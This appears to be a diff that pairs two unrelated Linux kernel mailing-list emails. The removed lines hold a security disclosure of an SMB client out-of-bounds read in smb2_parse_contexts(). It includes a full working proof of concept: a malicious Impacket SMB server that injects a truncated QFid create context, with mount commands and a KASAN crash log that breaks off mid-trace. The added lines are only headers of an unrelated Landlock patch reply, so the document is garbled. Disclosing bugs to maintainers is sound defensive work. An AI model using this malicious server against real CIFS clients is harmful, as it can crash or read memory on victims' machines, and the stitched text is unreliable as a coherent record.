@@ -1,751 +1,186 @@
-Received: from mail-lr2-f34.google.com (mail-lr2-f34.google.com [74.125.230.98])
+Received: from mail-wr2-f35.google.com (mail-wr2-f35.google.com [74.125.225.99])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 7E6513876A9
-	for <linux-cifs@vger.kernel.org>; Sat, 26 Sep 2026 07:01:48 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=74.125.230.98
-ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1790406111; cv=pass; b=kJMQOxhT0oee3y+tdwd8U7qAkFszVmlpxDE+ZfH24BAhCD1CByJnIGeeC7zqzP0NkecE6NX+bX2v6D41lvvthUECntRAlLChsNtDElVvmRDDZyZVIrFsWZJR9pvqJuYXkt9V+VGmpMrDBThYUpY8iYsTKtjPbjgHNR9pmITKLZY=
-ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1790406111; c=relaxed/simple;
-	bh=Rmm2SEe0q+WBujaPvKtEypO4p6Nslq/NVAv4L9MOiMM=;
-	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
-	 To:Cc:Content-Type; b=fVH1HKe8X5xzXpyV+za0gURarrUueKjz0YWecVeq8qR3d6kSi5J4YHmCAA+/qJdx6A0lXmJ7WmB7kMtosOGp3PW6zkCOVK0sQhNF/qmVqVlXajUUFPBYS+WAH4KzZcmQSbLV6w8b1luA+5uEdsxUwCYZE6BtiKox/iXo9qYiWdQ=
-ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=FzmyGjPw; arc=pass smtp.client-ip=74.125.230.98
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 4ACF73A5452
+	for <linux-cifs@vger.kernel.org>; Sat, 26 Sep 2026 07:56:36 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.225.99
+ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1790409399; cv=none; b=DKtk5NypoqEONx6OmFYCD9yuDjQaTDxfkgspR7w1ozpprKjdxfVSarrM35/mOdPjhN20LQj3kobSmuYhYRkOoep+xM7zKn4xQl6p1Brah3219/dj/pawldR6m9u6g66JVF75IuoHSy7i/7HcM+WmomhSB6Z2NPB3ByPFhzRn40E=
+ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1790409399; c=relaxed/simple;
+	bh=yY5aPVN1kZdRX24f/rOo18N2WyJh702NUMPAilvlSUI=;
+	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
+	 Content-Type:Content-Disposition:In-Reply-To; b=UAG5jFiGkez/G7tQxboECa5AN5W+FeAHLyLtAcLrmQRF5OTMMTu0SMEQad4T3j3zkTvreBcSD3oOekY0mFRmXRl5baHCE9SWEZFZoZkei6LzL6TIuhTgT086aiswFoDL6lFVDXNu730N+44W31lcKmIATNno0kIAkeiVGumi2rc=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=mmiKvR24; arc=none smtp.client-ip=74.125.225.99
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="FzmyGjPw"
-Received: by mail-lr2-f34.google.com with SMTP id 38308e7fff4ca-3a659f68ac6so4584121fa.0
-        for <linux-cifs@vger.kernel.org>; Sat, 26 Sep 2026 00:01:48 -0700 (PDT)
-ARC-Seal: i=1; a=rsa-sha256; t=1790406106; cv=none;
-        d=google.com; s=arc-20260327;
-        b=V0X5WkFz5zxzeyvYuyv5xyLzCmbojQBkkaadOKJ/xmtUvMOf3A8cNRprAJJrbqJIOV
-         6CdABC8GZW6t6PCyU/yo4uUuWoSfKVc7EemE7OAKWlYG2XaWQIO6dKe62OqmEKMLdUii
-         IznxQSSl5LnES6Qn/+O46XTJU8L0IZDGzh1M74WvF/tvf+n60YPJRbBjiXN3bjq9pKCG
-         lbnGHGZIdOHXyd8kW+227ra+LUjV0CsJdUX1fShu+Hj9hZI3nucY3NH1byEx2ZJ6oh+o
-         hhk4a01DoubvoBVAxM8/YwtygVgrfuTuMO8eDIkH8/c1IViSvDJ6zgPrJw706g7ti/qB
-         emIA==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
-        h=content-transfer-encoding:cc:to:subject:message-id:date:from
-         :in-reply-to:references:mime-version:dkim-signature;
-        bh=HkAH0ElqWQcmlizAkROJe5rZXlgPBqdsI0w1manhKdE=;
-        fh=Ba9cfDCw0DhyDxSO2xmd4irEqyYzeHwYKK4xp7FcM1s=;
-        b=pzbNblf3YT8fckAMEjsj0U4tvwSij7R9W291t0yJ2Eluektl1SWKKNZR94JrpFFET9
-         eEZuJM7+dwZ9zzKLPr2I0gL05pWfbULccsGOE+j/TR2n0rFLrVv1dvw/1+jTVwdgmYQi
-         QZY47PSC35dDPJboK2xTLQVJPskGXHNaXJ64C2SoDpBXhb4v+v2AlYy21p6//WBgwAtw
-         q6HvK0qU4HGKSwQPnumlGCUYj4nWsjlpTDslvQnE9Kw3QQQ0M6oZ06/R1g58hUHrFQD9
-         zl+L9eKaEBtNLcwhWr3CGKplQvlE4Six+cYrTisSeemMmIb+HHn1glVBHTqFxwh7fqMS
-         jUtQ==;
-        darn=vger.kernel.org
-ARC-Authentication-Results: i=1; mx.google.com; arc=none
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="mmiKvR24"
+Received: by mail-wr2-f35.google.com with SMTP id ffacd0b85a97d-4887840c529so548677f8f.1
+        for <linux-cifs@vger.kernel.org>; Sat, 26 Sep 2026 00:56:36 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=nebusec.ai; s=google; t=1790406106; x=1791010906; darn=vger.kernel.org;
-        h=content-transfer-encoding:content-type:cc:to:subject:message-id
-         :date:from:in-reply-to:references:mime-version:from:to:cc:subject
-         :date:message-id:reply-to:content-type;
-        bh=HkAH0ElqWQcmlizAkROJe5rZXlgPBqdsI0w1manhKdE=;
-        b=FzmyGjPw0YEuTuzunYd4nyhz/zZ6fW2Pe3xM4XFo0xgCaP0bcdc98Ucn8Nts470rj8
-         91Lag7C5ugFTiuiXAHCmF8saikc6eNwAXuFRq6u50ufzsnBBwSjRpJTb/zPR/LYnxSWW
-         70uqqshsSnxa9L81NFB6Hjgor5o4Wxxden79H4k4Cwf1AduU9kDsAgo4UY+JMMZnN4Zu
-         +q09pKkuIfENH1ZJ6urYf5irC0HgVUvVfXorps0Y83y+55WoEdBPkrRPxktLXImCz5jc
-         9gB7B5Guo6pjQ3RXsz7rr+Emsm200Vr6XeUEbh21/AeY+13AZKeHrV/VbG4momxAlXzM
-         uXsQ==
+        d=gmail.com; s=20251104; t=1790409394; x=1791014194; darn=vger.kernel.org;
+        h=in-reply-to:content-transfer-encoding:content-disposition
+         :content-type:mime-version:references:message-id:subject:cc:to:from
+         :date:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=YI9LML6UkRl05Tm2nCgeCpB6+5W0fxaRHeYbqDyeGfo=;
+        b=mmiKvR24FbgMjygoeg6BB8jRgCPJkWtPtwrwqdGb7ukGfBXGooX1tM8Cxvka87E4Ft
+         xI0fdGXhg0KAD0IfL3KIDWpM+cYK3kNr0arfep+z1tDNlL+Kr7G6ISQLpZk8dIaGA1YE
+         dH97uGTKbS0UH+/Dfpg5EfoLhYKRk072eZjojnBB3KeYUJx3Yi4WFNTPdYKnc4okaN5L
+         HQf2dWR3lIEogxRJi7BOJN/4go+24yCl49OccXKY68Jwbe7fEgNXXeLXhfu+eT9CQMG5
+         3oPoBj8JL6cVvWmb0HsXtXUoL4AQd2bts16KJ7CL/ESeAkFGH3AKwd5AtErE/sbq9sDW
+         KVeQ==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20260707; t=1790406106; x=1791010906;
-        h=content-transfer-encoding:content-type:cc:to:subject:message-id
-         :date:from:in-reply-to:references:mime-version:x-gm-gg
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
-         :content-type;
-        bh=HkAH0ElqWQcmlizAkROJe5rZXlgPBqdsI0w1manhKdE=;
-        b=FTcXK9TsXN3xORwFvUb7wcbqG1IvraTsbDSc5e6ZQK7bKBwjjxfrbhaZQOiXweMxQq
-         COyBGOs9lLAmt2QUR1RLkkF69DV8eU+OqD7ltVS3lN0uapP1G0yIOU7LO7GfA0cNt2GJ
-         NXCXyfBhxHqEoRtSGtdle4tt8nJPBeD5OS1euot18EPaPLpSObGg4mdMTSS8RtS9LoTW
-         9lfPVHYPMops+aFTlE6UICOCNtZ4nh2IULwqNosSW+1g/O/eyV3dv0RXUVB9Tg6+yf3V
-         aCusgw8Gf66EmYCRTcPMgcT1Lrq+Km8Ii0DjPBaSSO9BHFRRcVmE0pN/1fsiLkCuymT1
-         OaRg==
-X-Forwarded-Encrypted: i=1; AKwUvByr3Bj7yOje87vHs1MWEuVPbWy56vQNxS4HoDubm0WsdLiFGKNaAmer5jaXzuJEFz7jPOqEzajfPx0F@vger.kernel.org
-X-Gm-Message-State: AFuF++mryeZcQP3xs/Rh8K3YkSCzGyboWVYkpQ1ur127UZM0Hxe3VR0K
-	DSP4mE15xsyOPcUk0VY1S2oi7QdGwlhm2Y0nUyROIbYRC5QeuSWWqRwmFclnNgz4zsm4+ZAIfWn
-	/aW5tuvtP/rZ57oM85Vax0/DsWAa0i0PwDR4YxowFY88=
-X-Gm-Gg: AYBFou3Y3Y2Ip6VEmf3PMqMWHUbQLR7sOFHU5/A8xNAvaw3+MyY8OxDH4sybq0Y+k3z
-	IKj6LKvfsyVtVQQnx4LRCbBEuOWT8ThUgqAo0eVPqVxzLF/9tjunRsAiBFTTvu60FJnvQu2UZ0d
-	hAxxNK0hksoR6yTh7yG3OpPS43xNuXasEiXmFxpxE1AOH1gQfzu8ReqXf+mxoS9a4RvgHWpumqG
-	tOEjsqCjm3EI86S9r1nda8bz6f4JHCWepBzsX3qrZFDL/H9Uo4arBrhVvNKW5EV5MJv+kpwPUMl
-	TjzrgZm5A4N3HSEiM5sndgWFfI9+5Y0ES64cpXUb4CKnkqIC1RHMmU/rOsEVQOlqS+pazVtfeUZ
-	88Oizl3Vo3g==
-X-Received: by 2002:a05:651c:31c6:b0:3a5:d0ad:7df5 with SMTP id
- 38308e7fff4ca-3a63c0f6fb0mr18968391fa.21.1790406106269; Sat, 26 Sep 2026
- 00:01:46 -0700 (PDT)
+        d=1e100.net; s=20260707; t=1790409394; x=1791014194;
+        h=in-reply-to:content-transfer-encoding:content-disposition
+         :content-type:mime-version:references:message-id:subject:cc:to:from
+         :date:x-gm-gg:x-gm-message-state:from:to:cc:subject:date:message-id
+         :reply-to:content-type;
+        bh=YI9LML6UkRl05Tm2nCgeCpB6+5W0fxaRHeYbqDyeGfo=;
+        b=srt7Zh89DOZVLSas1hjSojbZY/JyApIyIFsKiioaXgYB5+EYegbtLnt7FF29/rwaSY
+         J55DUBT5fIprLsrDzyJA0xPPugRs6fhXkL6FA2n2MPTsQuj6NFcot0bNzJ3wYUcb+9xo
+         pwpaEuwjT1STOjT1TEFarD8x2ZC6qTDHqc4P7SyyTDST1nxVLI0AI5hceiEnO+bsZrs4
+         LMG61OGSgtPvA2FHBlRlgIQ9P5+eg1YxcG35lugaqJ5j36Lp7VE4VgOqV4q2JigtqPwi
+         eDLcA6zpu8NGs0VohrKMiP4a2sC5vn/r9hjrU/II/7XhGU6eENudLbnyoY0Sa2MZVAF1
+         XneQ==
+X-Forwarded-Encrypted: i=1; AKwUvByUDGBN/8fnd5lpPaqDz3imyaAoCnnRD+9TD01GiAYfAT10+rLU5dNYqly6WuZjC7JwZQmsNtuM2mF+@vger.kernel.org
+X-Gm-Message-State: AFuF++kn9l8OB1DjTQOdGquilygY+zi5YeUQcMFFuyAcdGXX65jXjgAQ
+	OSUxhwmTJbCkkBwKX5Hq+wgEC0QXOO8l8ceoV2qpXVrJltYI3BShKURR
+X-Gm-Gg: AYBFou3t+356JfuW/l/FbZ/1mE+nxisIncJXXnwF0VtpJf/9VstCdVdNV9ivUOsZ1xt
+	G9ddjtgTmvM6cEOZ6+8ER3b+pDDExULgNW++qhLB6Ynl3X57zPFKEAsHJU+/tjjpBZx75fFPOL6
+	M3xZdfpnHqO9cxtZ8/PottVBdMy7u07z2Tq+4pRoldY+ORh+eZUqrzsQyN7utkDmwrivlDtLCUX
+	eBIy35Fzyb54gSyMlwPrgVjFfkYKcHrEm5hMSLImogPXwm3MZJxcf1CQzJZEwpHHsRdSDorFFT5
+	GjGZc9sMuqM/tU1oD1jClAyymT1LvvIni1MYyrNpZcXkmSHiZW8qNRQD2m6+YXXYDhOk/zsGTmd
+	yUCfksc1MtO9l4yycDPYnUAO8mbvAbdyKGi+yf6sR+USz8I3I5K647rQDUsIYCAjFyySg8ovYu5
+	jzRYrvV0byM0001PNV/Bx4OL88HidJG0FR5ZWnhUjqFXIUkvQXmwdSgdBMhl8FVZ3PeImWY/5Ya
+	UB+y+kgHsiE1iR5J+otnfU=
+X-Received: by 2002:a05:600c:8b82:b0:49f:fefc:7d01 with SMTP id 5b1f17b1804b1-49ffefc7e4dmr2208755e9.15.1790409394348;
+        Sat, 26 Sep 2026 00:56:34 -0700 (PDT)
+Received: from localhost (ip87-106-108-193.pbiaas.com. [87.106.108.193])
+        by smtp.gmail.com with ESMTPSA id 5b1f17b1804b1-49fe667ae2fsm204215155e9.13.2026.09.26.00.56.33
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Sat, 26 Sep 2026 00:56:33 -0700 (PDT)
+Date: Sat, 26 Sep 2026 09:56:28 +0200
+From: =?iso-8859-1?Q?G=FCnther?= Noack <gnoack3000@gmail.com>
+To: Justin Suess <utilityemal77@gmail.com>
+Cc: Cai Xinchen <caixinchen1@huawei.com>, mic@digikod.net,
+	gnoack@google.com, paul@paul-moore.com, jmorris@namei.org,
+	serge@hallyn.com, corbet@lwn.net, skhan@linuxfoundation.org,
+	rdunlap@infradead.org, gregkh@linuxfoundation.org,
+	rafael@kernel.org, dakr@kernel.org, dlemoal@kernel.org, hch@lst.de,
+	axboe@kernel.dk, viro@zeniv.linux.org.uk, brauner@kernel.org,
+	jack@suse.cz, dhowells@redhat.com, code@tyhicks.com,
+	linkinjeon@kernel.org, sj1557.seo@samsung.com, yuezhang.mo@sony.com,
+	hirofumi@mail.parknet.co.jp, cel@kernel.org, jlayton@kernel.org,
+	neil@brown.name, okorniev@redhat.com, Dai.Ngo@oracle.com,
+	tom@talpey.com, miklos@szeredi.hu, amir73il@gmail.com,
+	senozhatsky@chromium.org, chenxiaosong@chenxiaosong.com,
+	zohar@linux.ibm.com, roberto.sassu@huawei.com,
+	dmitry.kasatkin@gmail.com, eric.snowberg@oracle.com,
+	stephen.smalley.work@gmail.com, omosnacek@gmail.com,
+	casey@schaufler-ca.com, nanx95726@gmail.com, djwong@kernel.org,
+	daniel@iogearbox.net, linux-security-module@vger.kernel.org,
+	linux-doc@vger.kernel.org, linux-kernel@vger.kernel.org,
+	driver-core@lists.linux.dev, linux-block@vger.kernel.org,
+	linux-fsdevel@vger.kernel.org, netfs@lists.linux.dev,
+	ecryptfs@vger.kernel.org, exfat@lists.linux.dev,
+	linux-nfs@vger.kernel.org, linux-unionfs@vger.kernel.org,
+	linux-cifs@vger.kernel.org, linux-integrity@vger.kernel.org,
+	selinux@vger.kernel.org, linux-kselftest@vger.kernel.org,
+	xiujianfeng@huawei.com, lujialin4@huawei.com
+Subject: Re: [PATCH RFC -next 00/12] landlock: Add READ_METADATA and
+ WRITE_METADATA access rights
+Message-ID: <20260926.255b951d3013@gnoack.org>
+References: <20260924104831.1081137-1-caixinchen1@huawei.com>
+ <araxO4ze0KZBz756@suesslenovo>
 Precedence: bulk
 X-Mailing-List: linux-cifs@vger.kernel.org
 List-Id: <linux-cifs.vger.kernel.org>
 List-Subscribe: <mailto:linux-cifs+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-cifs+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-References: <cover.1790398755.git.zihanx@nebusec.ai>
-In-Reply-To: <cover.1790398755.git.zihanx@nebusec.ai>
-From: zihan xi <zihanx@nebusec.ai>
-Date: Sat, 26 Sep 2026 15:01:36 +0800
-X-Gm-Features: AclHuK-IW3IfWwlOaNDpqQ7Vsmdw0eSUiVdAf9GSir0WSvmG6gF0c9pPWvUgEDQ
-Message-ID: <CAANe3eRw6ySzMQJP2g=vBXfZeNqWNW8eX5vTmzp5bxfaA8+9bA@mail.gmail.com>
-Subject: Re: [PATCH v5 0/6] smb: client: fix create context out-of-bounds reads
-To: Paulo Alcantara <pc@manguebit.org>
-Cc: ronniesahlberg@gmail.com, sprasad@microsoft.com, tom@talpey.com, 
-	bharathsm@microsoft.com, pshilovsky@samba.org, aaptel@suse.com, 
-	pali@kernel.org, linux-cifs@vger.kernel.org, samba-technical@lists.samba.org, 
-	linux-kernel@vger.kernel.org, stable@vger.kernel.org, 
-	Namjae Jeon <linkinjeon@kernel.org>
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
+Content-Type: text/plain; charset=utf-8
+Content-Disposition: inline
+Content-Transfer-Encoding: 8bit
+In-Reply-To: <araxO4ze0KZBz756@suesslenovo>
 
-On Sat, Sep 26, 2026 at 2:49=E2=80=AFPM Zihan Xi <zihanx@nebusec.ai> wrote:
->
-> Hi Linux kernel maintainers,
->
-> We found and validated an issue in fs/smb/client/smb2pdu.c. A malicious
-> SMB server can send a malformed SMB2 CREATE response to a CIFS client and
-> trigger an out-of-bounds read. We validated this with an Impacket server =
-on
-> the QEMU host and a root CIFS client in the guest; CIFS does not set
-> FS_USERNS_MOUNT, so the mount must run as root. For valid SMB responses,
-> the series preserves existing request handling. No impact was observed in
-> the tested CIFS mount/read path; a full filesystem regression suite was n=
-ot
-> run.
->
-> We will provide detailed information about the bug
-> in this email, along with a PoC to trigger it.
->
-> ---- details below ----
->
-> Bug details:
->
-> smb2_parse_contexts() validates the complete create-context area but does
-> not limit each context record to its Next field before dispatching it. A
-> malformed chain can therefore allow a handler to read bytes beyond the
-> current context. The QFid handler also cast the context to a full respons=
-e
-> structure without verifying that DataLength covered DiskFileId, so a
-> truncated QFid context could read past the response allocation. A
-> non-terminal Next that does not leave a complete following context header
-> is rejected as malformed.
->
-> The parser rejects NameOffset and DataOffset values before the context
-> header, bounds the name range by the current record with checked arithmet=
-ic,
-> and dispatches known handlers only when DataLength is non-zero.
->
-> The SMB2/SMB3 lease parsers also read LeaseState and LeaseFlags at
-> canonical offsets rather than from DataOffset. Patch 1 limits each record
-> to Next, reads QFid data only when its payload covers DiskFileId, and
-> parses lease data from DataOffset with the exact v1/v2 lease payload size=
-s.
-> A size mismatch skips lease parsing without failing the open. These sizes
-> match the fixed payload sizes used by the CIFS request builders and
-> ksmbd; a future extension must update the parser explicitly.
->
-> parse_posix_ctxt() reads nlink, reparse_tag, and mode before checking tha=
-t
-> the POSIX data contains them. The in-tree smb2_open_file() path passes a
-> NULL posix pointer, so ordinary opens do not reach this handler. Patch 2
-> still checks the handler's minimum data length and preserves soft failure
-> for malformed optional metadata.
->
-> Tracing the parser callers and compound error paths through cleanup and
-> return-value handling also exposed the additional independent issues fixe=
-d
-> by patches 3 through 6.
->
-> After a successful CREATE, SMB2_open() increments num_remote_opens before
-> parsing its contexts. Patch 3 calls SMB2_close() after a parsing failure.
-> SMB2_close() decrements num_remote_opens only after a confirmed successfu=
-l
-> close response. If a close is interrupted or transport fails, the existin=
-g
-> best-effort behavior retains conservative accounting when the remote resu=
-lt
-> is unknown.
->
-> open_cached_dir() sends CREATE and QUERY_INFO as a compound request. Patc=
-h
-> 4 validates the CREATE response before using its fields, records the CREA=
-TE
-> FIDs, marks the handle open, and increments the remote-open count before
-> processing later-command errors. It also handles -EREMCHG before response
-> validation, so a missing response does not hide the reconnect request.
-> Patch 5 marks earlier completed mids as cancelled when a later compound
-> wait is interrupted or MID synchronization or state validation fails. It
-> keeps their response buffers attached until synchronization is complete, =
-so
-> the existing cancelled-mid cleanup can inspect each successful CREATE and
-> queue SMB2_close(). The remote-open count is incremented only after close
-> work allocation succeeds and before queueing it, so an OOM does not leave
-> an unmatched count. It marks smb2_unlink()'s create+close compound so it
-> is not closed again. Non-CREATE responses and compounds with a close keep
-> their existing behavior.
->
-> Patch 6 preserves a create-context parsing error in the
-> SMB2_OP_OPEN_QUERY compound path while later responses are processed.
->
-> The series keeps separate Fixes tags for the independent root causes, wit=
-h
-> each tag pointing to the earliest commit that introduced its root cause.
->
-> The parser changes overlap with Frank Sorenson's related bounds-checking
-> patch for smb2_parse_contexts():
-> https://lore.kernel.org/all/20260826153147.4112943-12-sorenson@redhat.com=
-/
-> This series incorporates the NameOffset, Next, and zero-data dispatch che=
-cks
-> while retaining the stricter per-record successor-header validation and t=
-he
-> handler-specific payload checks.
->
-> The reproducer uses an Impacket SMB server that modifies the SMB2 CREATE
-> response. packetdrill is not used because it cannot implement the require=
-d
-> stateful SMB server or rewrite this response.
->
-> Reproducer:
->
-> From the PoC directory:
->
->     gcc -O2 -static -o poc poc.c
->     chmod +x poc.sh
->     ./poc
->
-> The wrapper starts the Impacket server on the host at tcp/4445. The
-> validation uses QEMU user-mode networking (`-netdev user`), so no
-> additional veth, network namespace, or TCP proxy is needed. Configure the
-> guest interface and route as follows:
->
->     ip link set eth0 up
->     ip addr add 10.0.2.15/24 dev eth0
->     ip route add default via 10.0.2.2
->
-> Then, as root in the guest, mount the share and read the trigger file:
->
->     mkdir -p /mnt/test
->     mount -t cifs //10.0.2.2/SHARE /mnt/test \
->         -o user=3D,password=3D,vers=3D2.0,sec=3Dntlmssp,port=3D4445,noper=
-m,soft
->     cat /mnt/test/probe >/dev/null
->
-> The C wrapper execs ./poc.sh, so poc.sh must retain its executable bit (o=
-r
-> be made executable with chmod +x as shown). On first use, the wrapper
-> creates a virtual environment and installs Impacket 0.13.1. The initial
-> setup requires network access to the configured package index; an existin=
-g
-> virtual environment needs no installation.
-> The guest-side mount is shown separately because CIFS does not set
-> FS_USERNS_MOUNT; the validated mount/read commands run as root in the
-> guest.
->
-> We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
-> ------BEGIN poc.c------
-> #include <stdio.h>
-> #include <unistd.h>
->
-> int main(int argc, char **argv)
-> {
->         (void)argc;
->         argv[0] =3D "./poc.sh";
->         execv(argv[0], argv);
->         perror("execv ./poc.sh");
->         return 127;
-> }
-> ------END poc.c--------
->
-> ------BEGIN poc.sh------
-> #!/bin/bash
-> set -euo pipefail
->
-> SCRIPT_DIR=3D$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)
-> VENV_DIR=3D"$SCRIPT_DIR/.venv-impacket"
->
-> if [[ ! -x "$VENV_DIR/bin/python" ]]; then
->     python3 -m venv "$VENV_DIR"
->     "$VENV_DIR/bin/pip" install impacket=3D=3D0.13.1
-> fi
->
-> exec "$VENV_DIR/bin/python" "$SCRIPT_DIR/poc.py" "$@"
-> ------END poc.sh--------
->
-> ------BEGIN poc.py------
-> #!/usr/bin/env python3
-> import logging
-> import signal
-> import struct
-> from pathlib import Path
->
-> from impacket import smbserver
-> from impacket import smb3structs as smb2
-> from impacket.nt_errors import STATUS_SUCCESS
->
->
-> PORT =3D 4445
-> SHARE_NAME =3D "SHARE"
-> TARGET_NAME =3D "probe"
-> TARGET_OFFSET =3D 424
-> CONTEXT =3D struct.pack("<IHHHHI4s4x", 0, 16, 4, 0, 24, 0, b"QFid")
-> ALIGN_PAD =3D b"\x00" * (TARGET_OFFSET - 152)
->
->
-> def prepare_share(share_dir: Path) -> None:
->     share_dir.mkdir(parents=3DTrue, exist_ok=3DTrue)
->     (share_dir / "placeholder").touch()
->     (share_dir / TARGET_NAME).write_bytes(b"x")
->
->
-> def main() -> None:
->     base_dir =3D Path(__file__).resolve().parent
->     share_dir =3D base_dir / "share"
->     prepare_share(share_dir)
->
->     logging.basicConfig(level=3Dlogging.INFO, format=3D"%(levelname)s:%(m=
-essage)s")
->
->     original =3D smbserver.SMB2Commands.smb2Create
->
->     def malicious_smb2_create(conn_id, smb_server, recv_packet):
->         req =3D smb2.SMB2Create(recv_packet["Data"])
->         raw_name =3D req["Buffer"][: req["NameLength"]]
->         name =3D smbserver.normalize_path(raw_name.decode("utf-16le"))
->
->         commands, packets, error =3D original(conn_id, smb_server, recv_p=
-acket)
->         print(f"CREATE name=3D{name!r} err=3D0x{error:08x}", flush=3DTrue=
-)
->
->         if error =3D=3D STATUS_SUCCESS and name =3D=3D TARGET_NAME:
->             resp =3D commands[0]
->             resp["CreateContextsOffset"] =3D TARGET_OFFSET
->             resp["CreateContextsLength"] =3D len(CONTEXT)
->             resp["AlignPad"] =3D ALIGN_PAD
->             resp["Buffer"] =3D CONTEXT
->             print(
->                 f"injected truncated QFid context; packet_len=3D{64 + len=
-(resp.getData())}",
->                 flush=3DTrue,
->             )
->
->         return commands, packets, error
->
->     smbserver.SMB2Commands.smb2Create =3D staticmethod(malicious_smb2_cre=
-ate)
->
->     server =3D smbserver.SimpleSMBServer(listenAddress=3D"0.0.0.0", liste=
-nPort=3DPORT)
->     server.setSMB2Support(True)
->     server.addShare(SHARE_NAME, str(share_dir), readOnly=3D"yes")
->     server.setLogFile("/dev/stdout")
->
->     print(f"Serving //10.0.2.2/{SHARE_NAME} on tcp/{PORT}", flush=3DTrue)
->     print("Trigger file: probe", flush=3DTrue)
->
->     signal.signal(signal.SIGTERM, lambda _sig, _frame: (_ for _ in ()).th=
-row(SystemExit(0)))
->     try:
->         server.start()
->     except (KeyboardInterrupt, SystemExit):
->         pass
->
->
-> if __name__ =3D=3D "__main__":
->     main()
-> ------END poc.py--------
->
-> The following excerpt is from the output of
-> scripts/decode_stacktrace.sh when run on the unpatched baseline log. The
-> command used was:
->
->     ./scripts/decode_stacktrace.sh vmlinux source-tree < baseline.log
->
-> The excerpt below is the resulting output.
-> ----BEGIN crash log----
-> [ 1344.780735] [  T11242] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D
-> [ 1344.780750] [  T11242] BUG: KASAN: slab-out-of-bounds in smb2_parse_co=
-ntexts (fs/smb/client/smb2pdu.c:3337)
-> [ 1344.780838] [  T11242] Read of size 8 at addr ff1100007e4b3180 by task=
- cat/11242
->
-> [ 1344.780880] [  T11242] CPU: 0 UID: 0 PID: 11242 Comm: cat Not tainted =
-7.0.0-08308-g9e1e9d660255 #1 PREEMPT(full)
-> [ 1344.780887] [  T11242] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + P=
-IIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
-> [ 1344.780907] [  T11242] Call Trace:
-> [ 1344.780918] [  T11242]  <TASK>
-> [ 1344.780925] [  T11242]  dump_stack_lvl (lib/dump_stack.c:88)
-> [ 1344.780980] [  T11242]  print_report (mm/kasan/report.c:288 (discrimin=
-ator 1) mm/kasan/report.c:376 (discriminator 1) mm/kasan/report.c:482 (disc=
-riminator 1))
-> [ 1344.781004] [  T11242]  ? smb2_parse_contexts (fs/smb/client/smb2pdu.c=
-:3337)
-> [ 1344.781009] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
-m/nospec-branch.h:381)
-> [ 1344.781030] [  T11242]  ? __virt_addr_valid (arch/x86/mm/physaddr.c:55=
-)
-> [ 1344.781052] [  T11242]  ? smb2_parse_contexts (fs/smb/client/smb2pdu.c=
-:3337)
-> [ 1344.781057] [  T11242]  kasan_report (mm/kasan/report.c:640)
-> [ 1344.781065] [  T11242]  ? smb2_parse_contexts (fs/smb/client/smb2pdu.c=
-:3337)
-> [ 1344.781077] [  T11242]  smb2_parse_contexts (fs/smb/client/smb2pdu.c:3=
-337)
-> [ 1344.781085] [  T11242]  ? _raw_spin_unlock (include/asm-generic/qspinl=
-ock.h:128 (discriminator 4) include/linux/spinlock.h:205 (discriminator 4) =
-include/linux/spinlock_api_smp.h:168 (discriminator 4) kernel/locking/spinl=
-ock.c:190 (discriminator 4))
-> [ 1344.781101] [  T11242]  SMB2_open (fs/smb/client/smb2pdu.c:3344)
-> [ 1344.781107] [  T11242]  ? cifsConvertToUTF16 (fs/smb/client/cifs_unico=
